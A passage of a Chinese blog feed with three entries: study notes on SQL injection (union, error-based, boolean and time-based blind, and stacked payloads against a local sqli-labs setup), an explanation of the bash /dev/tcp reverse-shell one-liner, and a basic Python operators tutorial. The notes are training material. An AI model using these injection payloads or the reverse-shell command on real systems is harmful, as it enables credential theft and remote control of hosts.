alt="img"></p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/bc9e4db1bc364e6aa0e3cdc8115c9005/aca94ac1ee07f8a361f1a990a26b8c11.jpg" alt="img"></p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/1d8f3b8affec40f99a01d5342ebc4d0e/20242323e0aee047d9aa9dbdb00c474e.jpg" alt="img"></p><p>0x等于% 16进制 0x27=%27 ====’单引号</p><p>数据库的字段信息都可以用16进制来代替</p><p>只能用0x 不能用%</p><p>以为这是数据库的字段 不能为url格式</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/61be0dc6b8f748e797a47241c6db9c9e/efb6e80b721f725981aedeb98f49d888.jpg" alt="img"></p><h4><span id="group-concat-ke-yi-ba-tong-yi-lie-de-zhi-fang-zai-yi-qi-xian-shi">group_concat  可以把同一列的值放在一起显示</span><a href="#group-concat-ke-yi-ba-tong-yi-lie-de-zhi-fang-zai-yi-qi-xian-shi" class="header-anchor">#</a></h4><p>‘union select 1,2,group_concat(password,0x7c7c,user) from security.users%23</p><p>下面是返回结果  0x7c7c ==》||</p><p>you||Angelina,p@ssword||Dummy,crappy||secure,stupidity||stupid,genious||superman,mob!le||batman,admin||admin,admin1||admin1,admin2||admin2,admin3||admin3,dumbo||dhakkan,admin4||admin4</p><h2><span id="bao-cuo-zhu-ru">报错注入</span><a href="#bao-cuo-zhu-ru" class="header-anchor">#</a></h2><h4><span id="yi-extractvalue-han-shu"><strong>一、extractvalue函数</strong></span><a href="#yi-extractvalue-han-shu" class="header-anchor">#</a></h4><p><a href="https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener">ExtractValue(xml_frag, xpath_expr)</a></p><p><a href="https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener">ExtractValue()</a>接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/6247c2803e9045e89003cc090c591b33/551927935215.png" alt="img"></p><p>（这里我们是为了学习报错注入，所以不需要太详细的知道该函数具体原理）</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/c5a8179558f04872b8bae0384fa6adba/551928141656.png" alt="img"></p><p>个人见解</p><h4><span id="er-floor">二、floor</span><a href="#er-floor" class="header-anchor">#</a></h4><p>1.rand（）是回随机产生一 ‘列’ 数  平时只是取出一行</p><p>2.rand（0）是固定产生一‘列 数    使用select * rand（0）永远取出的是第一列 </p><p>0.15522042769493574</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/9c34adb97fd24630beb944c330483a5b/clipboard.png" alt="img"></p><p>3.但是列是固定的 可能在开发时会用到这个固定不重复的列</p><p>但这个固定不重复的列也有顺序第一个列是小于0.5 之后两个个列大于0.5</p><p>所以 floor(rand(0)*2)会是011011</p><p>rand（）这个函数默认可以当作列 可能rand因为可以在列作运算如</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/572314954ddd4d3f86f7572f075e126e/clipboard.png" alt="img"></p><p>select count(<em>) ,floor(rand(0)</em>2)a from information_schema.tables group by  a;</p><p>报错信息：ERROR 1062 (23000): Duplicate entry ‘1’ for key ‘group_key’  </p><p>count() 和 group by 在一起会产生一个虚拟表</p><p>group by a 时 因为rand（0）函数的特殊性</p><p>第一次查询时虚拟表没有此列</p><p>会执行插入并再执行rand（0）的下一列 </p><p>然后到第五列 0 1 1 0 1 再插入1时会报错  因为1是主键</p><p>遇到第一个0执行插入   插入2个1 又遇到0这个未知行  再执行插入报错  </p><p>select count(<em>),concat(user(),’||’,floor(rand(0)</em>2)) as a from user group by a</p><p>下面语句得出来的是列      and之和布尔值作运算 所以前面再加上 select x from</p><p>select username from user where id = 1  and <strong>(select 1 from (select count(*),concat**</strong>(user()<strong>*<em>,’||’,floor(rand(0)\</em>2)) as a from user group by a)b);</strong>  </p><p>ERROR 1062 (23000): Duplicate entry ‘root@localhost||1’ for key ‘group_key’</p><p>(select schema_name from information_schema.schemata limit 0,1)</p><p>mysql&gt; select username from user where id = 1 and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 0,1),’||’,floor(rand(0)</em>2))a from user group by a)b);</p><p>ERROR 1062 (23000): Duplicate entry ‘information_schema||1’ for key ‘group_key’</p><p>mysql&gt; select username from user where id = 1 and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 1,1),’||’,floor(rand(0)</em>2))a from user group by a)b);</p><p>ERROR 1062 (23000): Duplicate entry ‘challenges||1’ for key ‘group_key’</p><p>mysql&gt; select username from user where id = 1 and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 2,1),’||’,floor(rand(0)</em>2))a from user group by a)b);</p><p>ERROR 1062 (23000): Duplicate entry ‘mysql||1’ for key ‘group_key’</p><p>mysql&gt; select username from user where id = 1 and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 3,1),’||’,floor(rand(0)</em>2))a from user group by a)b);</p><p>ERROR 1062 (23000): Duplicate entry ‘performance_schema||1’ for key ‘group_key’</p><p>mysql&gt;</p><h2><span id="bu-er-mang-zhu">布尔盲注</span><a href="#bu-er-mang-zhu" class="header-anchor">#</a></h2><p>substr(database(),    1,                1）                </p><p>​                security     第几位    一次取一个字符</p><p>布尔盲注</p><p>?id=1’ and (select length(database())=8) –+   判断数据库长度</p><p>?id=1’ and  length(database())=8 –+   判断数据库长度 可以不加select</p><p>如果不知道id的值 就需要用 or  ?id=-1’ or  length(database())=8 –+  </p><p>?id=1’ and ascii(substr(database(),1,1)) &gt;100 –+   判断数据库名第一个字母的ascii   </p><p>?id=1’ and (select count(*) from information_schema.tables where table_schema =’security’)&gt;2 –+   判断指定数据库有多少个表</p><p>?id=1’ and (select length(table_name) from information_schema.tables where table_schema =’security’ limit 0,1)&gt;2 –+   判断第一个表的长度</p><p>?id=1’ and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema =’security’ limit 0,1)&gt;99 –+   数据库第一个表的表名称第一个字母的ascii值</p><p>—————得到表名后 查表有多少个字段</p><p>?id=1’ and (select count(*) from emails)&gt;5 –+   查询表有多少行记录</p><p>?id=1’ and (select count(column_name )from information_schema.columns where table_name=’emails’)&gt;5 –+   查询表有多少列（column）</p><p>?id=1’ and (select ascii(substr(column_name,1,1))from information_schema.columns where table_name=’emails’ limit 0,1)&gt;5 –+   查询第个列名的第一个字母</p><p>—————知道列名查值</p><p>?id=1’ and (select ascii(substr(id,1,1)) from emails limit 0,1)&gt;100 –+  查询值的第一个字母的ascii</p><p>?id=-1 or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = 0x75393839377577785f6b6162656c limit 0,21)&gt;1</p><p>?id=-1 or (select length(table_name)) from information_schema.tables where table_schema = 0x75393839377577785f6b6162656c limit 22,1)&gt;1    可以用burp爆破</p><h2><span id="shi-jian-mang-zhu">时间盲注</span><a href="#shi-jian-mang-zhu" class="header-anchor">#</a></h2><p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and sleep(4)–+</p><p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and if (1=1,sleep(4),1)–+ 如果if条件成功则返回sleep(4) 否则返1</p><p>用上面的payload替换1=1用法和布尔盲注一致</p><p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and if (length(database()=8) ,sleep(4),1)–+  判断数据库长度</p><p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and if (ascii(substr(database(),1,1)) &gt;100 ,sleep(4),1)–+判断数据库名第一个字母的ascii   </p><p>后面过程参照上面布尔盲注过程</p><h2><span id="dui-die-zhu-ru">堆叠注入</span><a href="#dui-die-zhu-ru" class="header-anchor">#</a></h2><p>?id=1;update users set username = ‘ww’ where id =1 用分号隔断前面的语句再后面执行任意的sql语句</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;di-yi-bu-pan-duan-shu-ru-lei-xing&quot;&gt;第一步判断输入类型&lt;/span&gt;&lt;a href=&quot;#di-yi-bu-pan-duan-shu-ru-lei-xing&quot; class=&quot;header-anchor&quot;&gt;#&lt;/a&gt;&lt;/h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>反弹shell原理</title>
    <link href="http://yoursite.com/2019/11/23/%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2019/11/23/反弹shell原理/</id>
    <published>2019-11-23T15:30:12.587Z</published>
    <updated>2019-11-23T15:29:56.570Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linux-fan-dan-shell-shou-fa">linux反弹shell手法</span><a href="#linux-fan-dan-shell-shou-fa" class="header-anchor">#</a></h1><ol><li>sh/bash:</li></ol><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line">/bin/sh  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>先解释下相关概念0表示标准输入（默认键盘），1表示标准输出（默认显示器），2表示错误输出(默认显示器)<br>0&gt;&amp;1表示将标准输入重定向到标准输出 ，0&gt;1表示将标准输入重定向到文件名为1的文件，&amp;就是用来区分的标识符<br>还有linux是默认不把错误信息重定向到文件的，如图test3中并没有错误信息,而且两次命令得到的结果一样，即cmd &gt;file 等同于 cmd 1&gt;file</p><p><img src="https://upload-images.jianshu.io/upload_images/1011862-f2dc635541043acd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/534/format/webp" alt="img"></p><p>image.png</p><p>bash -i 生成一个交互式的子进程<br>/dev/tcp/192.168.21.1/8080 linux一切皆文件思想，其实就是与192.168.21.1:8080建立tcp连接<br>/bin/bash -i &gt; /dev/tcp/192.168.21.1/8080 表示bash子进程的标准输出重定向到远程的8080端口</p><p><img src="https://upload-images.jianshu.io/upload_images/1011862-2a666a408614db66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674/format/webp" alt="img"></p><p>image.png</p><p>由上图可以看到执行成功的命令id,pwd的结果都重定向到了远程8080，但是错误信息却直接输出到了屏幕，这就是上面说的linux是默认不把错误输出（也就是2）重定向到文件，所以需要再加上 2&gt;&amp;1（等同于&gt;&amp;）,即将错误输出也重定向到标准输出,因为标准输出已经重定向到了8080，所以错误输出也重定向到远程端口8080。</p><p>现在实现了将受害者的命令结果重定向到了远程的8080端口，但是作为交互式shell来说，我们还需要直接在监听端直接输入命令。我们再添加0&gt;&amp;1,表示将标准输入重定向到标准输出，和上面一样，标准输出已经重定向到了/dev/tcp/192.168.21.1/8080，所以标准输入也重定向到了远程，这样就可以在远端直接输入命令了。这就是网络上盛传的bash反弹shell的原理。<br>bash -i &gt; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1 2&gt;&amp;1 即<br>bash -i &gt;&amp; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;linux-fan-dan-shell-shou-fa&quot;&gt;linux反弹shell手法&lt;/span&gt;&lt;a href=&quot;#linux-fan-dan-shell-shou-fa&quot; class=&quot;header-anchor&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;&lt;ol&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python教程1</title>
    <link href="http://yoursite.com/2019/11/12/python%E6%95%99%E7%A8%8B1/"/>
    <id>http://yoursite.com/2019/11/12/python教程1/</id>
    <published>2019-11-11T16:22:53.000Z</published>
    <updated>2019-11-11T16:23:46.775Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="centos-huan-jing">centos环境</span><a href="#centos-huan-jing" class="header-anchor">#</a></h2><p> <a href="https://www.jianshu.com/p/df6241d7548c" target="_blank" rel="noopener">https://www.jianshu.com/p/df6241d7548c</a> yum源</p><p> <a href="https://www.cnblogs.com/s-seven/p/9105973.html" target="_blank" rel="noopener">https://www.cnblogs.com/s-seven/p/9105973.html</a> centos7下安装python3</p><h2><span id="python-zhu-shi">python注释</span><a href="#python-zhu-shi" class="header-anchor">#</a></h2><p>这是一个注释 print(“Hello, World!”)</p><p>多行注释用三个单引号 <strong>‘’’</strong> 或者三个双引号 <strong>“””</strong> 将注释括起来，例如:</p><p>1、单引号（’’’）</p><p>#!/usr/bin/python3  ‘’’ 这是多行注释，用三个单引号 这是多行注释，用三个单引号  这是多行注释，用三个单引号 ‘’’ print(“Hello, World!”)</p><p>2、双引号（”””）</p><p>#!/usr/bin/python3  “”” 这是多行注释，用三个双引号 这是多行注释，用三个双引号  这是多行注释，用三个双引号 “”” print(“Hello, World!”)</p><h2><span id="python-yun-suan-fu">Python运算符</span><a href="#python-yun-suan-fu" class="header-anchor">#</a></h2><h4><span id="python-suan-zhu-yun-suan-fu">Python算术运算符</span><a href="#python-suan-zhu-yun-suan-fu" class="header-anchor">#</a></h4><p>以下假设变量a为10，变量b为21：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加 - 两个对象相加</td><td align="left">a + b 输出结果 31</td></tr><tr><td align="left">-</td><td align="left">减 - 得到负数或是一个数减去另一个数</td><td align="left">a - b 输出结果 -11</td></tr><tr><td align="left">*</td><td align="left">乘 - 两个数相乘或是返回一个被重复若干次的字符串</td><td align="left">a * b 输出结果 210</td></tr><tr><td align="left">/</td><td align="left">除 - x 除以 y</td><td align="left">b / a 输出结果 2.1</td></tr><tr><td align="left">%</td><td align="left">取模 - 返回除法的余数</td><td align="left">b % a 输出结果 1</td></tr><tr><td align="left">**</td><td align="left">幂 - 返回x的y次幂</td><td align="left">a**b 为10的21次方</td></tr><tr><td align="left">//</td><td align="left">取整除 - 向下取接近除数的整数</td><td align="left"></td></tr></tbody></table><h4><span id="python-luo-ji-yun-suan-fu">Python逻辑运算符</span><a href="#python-luo-ji-yun-suan-fu" class="header-anchor">#</a></h4><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p><table><thead><tr><th align="left">运算符</th><th align="left">逻辑表达式</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">and</td><td align="left">x and y</td><td align="left">布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</td><td align="left">(a and b) 返回 20。</td></tr><tr><td align="left">or</td><td align="left">x or y</td><td align="left">布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td><td align="left">(a or b) 返回 10。</td></tr><tr><td align="left">not</td><td align="left">not x</td><td align="left">布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td align="left">not(a and b) 返回 False</td></tr></tbody></table><p>以上实例输出结果：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  a = 10 b = 20  if ( a and b ):   print (“1 - 变量 a 和 b 都为 true”) else:   print (“1 - 变量 a 和 b 有一个不为 true”)  if ( a or b ):   print (“2 - 变量 a 和 b 都为 true，或其中一个变量为 true”) else:   print (“2 - 变量 a 和 b 都不为 true”)  # 修改变量 a 的值 a = 0 if ( a and b ):   print (“3 - 变量 a 和 b 都为 true”) else:   print (“3 - 变量 a 和 b 有一个不为 true”)  if ( a or b ):   print (“4 - 变量 a 和 b 都为 true，或其中一个变量为 true”) else:   print (“4 - 变量 a 和 b 都不为 true”)  if not( a and b ):   print (“5 - 变量 a 和 b 都为 false，或其中一个变量为 false”) else:   print (“5 - 变量 a 和 b 都为 true”)</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 - 变量 a 和 b 都为 true</span><br><span class="line">2 - 变量 a 和 b 都为 true，或其中一个变量为 true</span><br><span class="line">3 - 变量 a 和 b 有一个不为 true</span><br><span class="line">4 - 变量 a 和 b 都为 true，或其中一个变量为 true</span><br><span class="line">5 - 变量 a 和 b 都为 false，或其中一个变量为 false</span><br></pre></td></tr></table></figure><hr><h4><span id="python-cheng-yuan-yun-suan-fu">Python成员运算符</span><a href="#python-cheng-yuan-yun-suan-fu" class="header-anchor">#</a></h4><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td align="left">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td align="left">not in</td><td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td align="left">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><p>以下实例演示了Python所有成员运算符的操作：</p><h4><span id="shi-li-python-3-0">实例(Python 3.0+)</span><a href="#shi-li-python-3-0" class="header-anchor">#</a></h4><p>#!/usr/bin/python3  a = 10 b = 20 list = [1, 2, 3, 4, 5 ];  if ( a in list ):   print (“1 - 变量 a 在给定的列表中 list 中”) else:   print (“1 - 变量 a 不在给定的列表中 list 中”)  if ( b not in list ):   print (“2 - 变量 b 不在给定的列表中 list 中”) else:   print (“2 - 变量 b 在给定的列表中 list 中”)  # 修改变量 a 的值 a = 2 if ( a in list ):   print (“3 - 变量 a 在给定的列表中 list 中”) else:   print (“3 - 变量 a 不在给定的列表中 list 中”)</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 - 变量 a 不在给定的列表中 list 中</span><br><span class="line">2 - 变量 b 不在给定的列表中 list 中</span><br><span class="line">3 - 变量 a 在给定的列表中 list 中</span><br></pre></td></tr></table></figure><hr><h4><span id="python-shen-fen-yun-suan-fu">Python身份运算符</span><a href="#python-shen-fen-yun-suan-fu" class="header-anchor">#</a></h4><p>身份运算符用于比较两个对象的存储单元</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">is</td><td align="left">is 是判断两个标识符是不是引用自一个对象</td><td align="left"><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td align="left">is not</td><td align="left">is not 是判断两个标识符是不是引用自不同对象</td><td align="left"><strong>x is not y</strong> ， 类似 <strong>id(a) != id(b)</strong>。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><p><strong>注：</strong> <a href="https://www.runoob.com/python/python-func-id.html" target="_blank" rel="noopener">id()</a> 函数用于获取对象内存地址。</p><p>以下实例演示了Python所有身份运算符的操作：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  a = 20 b = 20  if ( a is b ):   print (“1 - a 和 b 有相同的标识”) else:   print (“1 - a 和 b 没有相同的标识”)  if ( id(a) == id(b) ):   print (“2 - a 和 b 有相同的标识”) else:   print (“2 - a 和 b 没有相同的标识”)  # 修改变量 b 的值 b = 30 if ( a is b ):   print (“3 - a 和 b 有相同的标识”) else:   print (“3 - a 和 b 没有相同的标识”)  if ( a is not b ):   print (“4 - a 和 b 没有相同的标识”) else:   print (“4 - a 和 b 有相同的标识”)</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 - a 和 b 有相同的标识</span><br><span class="line">2 - a 和 b 有相同的标识</span><br><span class="line">3 - a 和 b 没有相同的标识</span><br><span class="line">4 - a 和 b 没有相同的标识</span><br></pre></td></tr></table></figure><blockquote><p>is 与 == 区别：</p><p>is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等。</p><p>&gt;&gt;&gt;a = [1, 2, 3] &gt;&gt;&gt; b = a &gt;&gt;&gt; b is a  True &gt;&gt;&gt; b == a True &gt;&gt;&gt; b = a[:] &gt;&gt;&gt; b is a False &gt;&gt;&gt; b == a True</p></blockquote><hr><h4><span id="python-yun-suan-fu-you-xian-ji">Python运算符优先级</span><a href="#python-yun-suan-fu-you-xian-ji" class="header-anchor">#</a></h4><p>以下表格列出了从最高到最低优先级的所有运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">指数 (最高优先级)</td></tr><tr><td align="left">~ + -</td><td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td align="left">* / % //</td><td align="left">乘，除，取模和取整除</td></tr><tr><td align="left">+ -</td><td align="left">加法减法</td></tr><tr><td align="left">&gt;&gt; &lt;&lt;</td><td align="left">右移，左移运算符</td></tr><tr><td align="left">&amp;</td><td align="left">位 ‘AND’</td></tr><tr><td align="left">^ |</td><td align="left">位运算符</td></tr><tr><td align="left">&lt;= &lt; &gt; &gt;=</td><td align="left">比较运算符</td></tr><tr><td align="left">== !=</td><td align="left">等于运算符</td></tr><tr><td align="left">= %= /= //= -= += <em>= *</em>=</td><td align="left">赋值运算符</td></tr><tr><td align="left">is is not</td><td align="left">身份运算符</td></tr><tr><td align="left">in not in</td><td align="left">成员运算符</td></tr><tr><td align="left">not and or</td><td align="left">逻辑运算符</td></tr></tbody></table><h2><span id="python3-shu-zi-number">Python3 数字(Number)</span><a href="#python3-shu-zi-number" class="header-anchor">#</a></h2><h4><span id="shi-yong-del-yu-ju-shan-chu-shu-zi-dui-xiang-de-yin-yong">使用del语句删除数字对象的引用</span><a href="#shi-yong-del-yu-ju-shan-chu-shu-zi-dui-xiang-de-yin-yong" class="header-anchor">#</a></h4><p>Python 数字数据类型用于存储数值。</p><p>数据类型是不允许改变的,这就意味着如果改变数字数据类型的值，将重新分配内存空间。</p><p>以下实例在变量赋值时 Number 对象将被创建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = 1</span><br><span class="line">var2 = 10</span><br></pre></td></tr></table></figure><p>您也可以使用del语句删除一些数字对象的引用。</p><p>del语句的语法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del var1[,var2[,var3[....,varN]]]</span><br></pre></td></tr></table></figure><p>您可以通过使用del语句删除单个或多个对象的引用，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del var</span><br><span class="line">del var_a, var_b</span><br></pre></td></tr></table></figure><h4><span id="san-chong-shu-zhi-lei-xing">三种数值类型</span><a href="#san-chong-shu-zhi-lei-xing" class="header-anchor">#</a></h4><ul><li><strong>整型(Int)</strong> - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。</li><li><strong>浮点型(float)</strong> - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 = 2.5 x 102 = 250）</li><li><strong>复数( (complex))</strong> - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。</li></ul><p>我们可以使用十六进制和八进制来代表整数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; number = 0xA0F # 十六进制</span><br><span class="line">&gt;&gt;&gt; number</span><br><span class="line">2575</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; number=0o37 # 八进制</span><br><span class="line">&gt;&gt;&gt; number</span><br><span class="line">31</span><br></pre></td></tr></table></figure><h4><span id="python-shu-zi-lei-xing-zhuan-huan">Python 数字类型转换</span><a href="#python-shu-zi-lei-xing-zhuan-huan" class="header-anchor">#</a></h4><p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p><ul><li><strong>int(x)</strong> 将x转换为一个整数。</li><li><strong>float(x)</strong> 将x转换到一个浮点数。</li><li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li><li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li></ul><p>以下实例将浮点数变量 a 转换为整数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = 1.0</span><br><span class="line">&gt;&gt;&gt; int(a)</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3><span id="shu-xue-han-shu">数学函数</span><a href="#shu-xue-han-shu" class="header-anchor">#</a></h3><table><thead><tr><th align="left">函数</th><th align="center">返回值 ( 描述 )</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-abs.html" target="_blank" rel="noopener">abs(x)</a></td><td align="center">返回数字的绝对值，如abs(-10) 返回 10</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-ceil.html" target="_blank" rel="noopener">ceil(x)</a></td><td align="center">返回数字的上入整数，如math.ceil(4.1) 返回 5</td></tr><tr><td align="left">cmp(x, y)</td><td align="center">如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1。 **Python 3 已废弃，使用 (x&gt;y)-(x。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-exp.html" target="_blank" rel="noopener">exp(x)</a></td><td align="center">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-fabs.html" target="_blank" rel="noopener">fabs(x)</a></td><td align="center">返回数字的绝对值，如math.fabs(-10) 返回10.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-floor.html" target="_blank" rel="noopener">floor(x)</a></td><td align="center">返回数字的下舍整数，如math.floor(4.9)返回 4</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-log.html" target="_blank" rel="noopener">log(x)</a></td><td align="center">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-log10.html" target="_blank" rel="noopener">log10(x)</a></td><td align="center">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-max.html" target="_blank" rel="noopener">max(x1, x2,…)</a></td><td align="center">返回给定参数的最大值，参数可以为序列。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-min.html" target="_blank" rel="noopener">min(x1, x2,…)</a></td><td align="center">返回给定参数的最小值，参数可以为序列。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-modf.html" target="_blank" rel="noopener">modf(x)</a></td><td align="center">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-pow.html" target="_blank" rel="noopener">pow(x, y)</a></td><td align="center">x**y 运算后的值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-round.html" target="_blank" rel="noopener">round(x [,n])</a></td><td align="center">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-sqrt.html" target="_blank" rel="noopener">sqrt(x)</a></td><td align="center">返回数字x的平方根。</td></tr></tbody></table><h4><span id="sui-ji-shu-han-shu">随机数函数</span><a href="#sui-ji-shu-han-shu" 